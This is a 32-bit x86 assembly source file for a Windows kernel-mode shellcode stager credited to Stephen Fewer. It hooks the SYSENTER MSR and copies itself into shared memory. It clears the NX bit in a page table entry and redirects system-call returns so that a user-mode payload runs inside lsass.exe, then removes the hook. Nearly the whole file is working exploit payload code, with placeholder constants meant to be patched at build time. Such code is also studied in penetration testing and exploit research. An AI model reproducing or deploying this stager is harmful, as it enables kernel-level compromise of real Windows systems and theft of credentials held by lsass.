;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista (Possibly 2003, XP)
; Size: 202 bytes
; Build: >build.py stager_sysenter_hook
;
; Recommended Reading: Kernel-mode Payloads on Windows, 2005, bugcheck & skape.
;                      http://www.uninformed.org/?v=3&a=4&t=sumry
;
; Description of the implementation of this stager_sysenter_hook shellcode:
;     http://www.harmonysecurity.com/blog/2009/11/implementing-win32-kernel-shellcode.html
;
;-----------------------------------------------------------------------------;
[bits 32]
[org 0]
;-----------------------------------------------------------------------------;
ring0_migrate_start:
	cld
	cli
	jmp short ring0_migrate_bounce ; jump to bounce to get ring0_stager_start address
ring0_migrate_patch:
	pop esi                        ; pop off ring0_stager_start address
	; get current sysenter msr (nt!KiFastCallEntry)
	push 0x176                     ; SYSENTER_EIP_MSR
	pop ecx
	rdmsr
	; save origional sysenter msr (nt!KiFastCallEntry)
	mov dword [ esi + ( ring0_stager_data - ring0_stager_start ) + 0 ], eax
	; retrieve the address in kernel memory where we will write the ring0 stager + ring3 code
	mov edi, dword [ esi + ( ring0_stager_data - ring0_stager_start ) + 4 ]
	; patch sysenter msr to be our stager
	mov eax, edi
	wrmsr
	; copy over stager to shared memory
	mov ecx, 0x41414141 ; ( ring3_stager - ring0_stager_start + length(ring3_stager) )
	rep	movsb
	sti ; set interrupt flag
	; Halt this thread to avoid problems.
ring0_migrate_idle:
	hlt
	jmp short ring0_migrate_idle
ring0_migrate_bounce:
	call ring0_migrate_patch ; call the patch code, pushing the ring0_stager_start address to stack
;-----------------------------------------------------------------------------;
; This stager will now get called every time a ring3 process issues a sysenter
ring0_stager_start:
	push byte 0 ; alloc a dword for the patched return address
	pushfd ; save flags and registers
	pushad
	call ring0_stager_eip
ring0_stager_eip:
	pop eax
	; patch in the real nt!KiFastCallEntry address as our return address
	mov ebx, dword [ eax + ( ring0_stager_data - ring0_stager_eip ) + 0 ]
	mov [ esp + 36 ], ebx
	; see if we are being told to remove our sysenter hook...
	cmp ecx, 0xDEADC0DE
	jne ring0_stager_hook
	push 0x176 ; SYSENTER_EIP_MSR
	pop ecx
	mov eax, ebx ; set the sysenter msr to be the real nt!KiFastCallEntry address
	xor edx, edx
	wrmsr
	xor eax, eax ; clear eax (the syscall number) so we can continue
	jmp short ring0_stager_finish
ring0_stager_hook:
	; get the origional r3 return address (edx is the ring3 stack pointer)
	mov esi, [ edx ]
	; determine if the return is to a "ret" instruction
	movzx ebx, byte [ esi ]
	cmp bx, 0xC3
	; only insert our ring3 stager hook if we are to return to a single ret (for stability).
	jne short ring0_stager_finish
	; calculate our r3 address in shared memory
	mov ebx, dword [ eax + ( ring0_stager_data - ring0_stager_eip ) + 8 ]
	lea ebx, [ ebx + ring3_start - ring0_stager_start ]
	; patch in our r3 stage as the r3 return address
	mov [ edx ], ebx
	; detect if NX is present (clobbers eax,ebx,ecx,edx)...
	mov eax, 0x80000001
	cpuid
	and edx, 0x00100000 ; bit 20 is the NX bit
	jz short ring0_stager_finish
	; modify the correct page table entry to make our ring3 stager executable
	mov edx, 0x45454545 ; we default to 0xC03FFF00 this for now (should calculate dynamically).
	add edx, 4
	and dword [ edx ], 0x7FFFFFFF ; clear the NX bit
	; finish up by returning into the real KiFastCallEntry and then returning into our ring3 code (if hook was set).
ring0_stager_finish:
	popad ; restore registers
	popfd ; restore flags
	ret ; return to real nt!KiFastCallEntry
ring0_stager_data:
	dd 0xFFFFFFFF ; saved nt!KiFastCallEntry
	dd 0x42424242 ; kernel memory address of stager (default to 0xFFDF0400)
	dd 0x43434343 ; shared user memory address of stager (default to 0x7FFE0400)
;-----------------------------------------------------------------------------;
ring3_start:
	pushad
	push byte 0x30
	pop eax
	cdq ; zero edx
	mov ebx, [ fs : eax ] ; get the PEB
	cmp [ ebx + 0xC ], edx
	jz ring3_finish
	mov eax, [ ebx + 0x10 ] ; get pointer to the ProcessParameters (_RTL_USER_PROCESS_PARAMETERS)
	mov eax, [ eax + 0x3C ] ; get the current processes ImagePathName (unicode string)
	add eax, byte 0x28 ; advance past '*:\windows\system32\' (we assume this as we want a system process).
	mov ecx, [ eax ] ; compute a simple hash of the name. get first 2 wide chars of name 'l\x00s\x00'
	add ecx, [ eax + 0x3 ] ; and add '\x00a\x00s'
	cmp ecx, 0x44444444 ; check the hash (default to hash('lsass.exe') == 0x7373616C)
	jne ring3_finish ; if we are not currently in the correct process, return to real caller
	call ring3_cleanup ; otherwise we first remove our ring0 sysenter hook
	call ring3_stager ; and then call the real ring3 payload
	jmp ring3_finish ; should the payload return we can resume this thread correclty.
ring3_cleanup:
	mov ecx, 0xDEADC0DE ; set the magic value for ecx
	mov edx, esp ; save our esp in edx for sysenter
	sysenter ; now sysenter into ring0 to remove the sysenter hook (return to ring3_cleanup's caller).
ring3_finish:
	popad
	ret ; return to the origional system calls caller
;-----------------------------------------------------------------------------;
ring3_stager:
	; ...ring3 stager here...
;-----------------------------------------------------------------------------;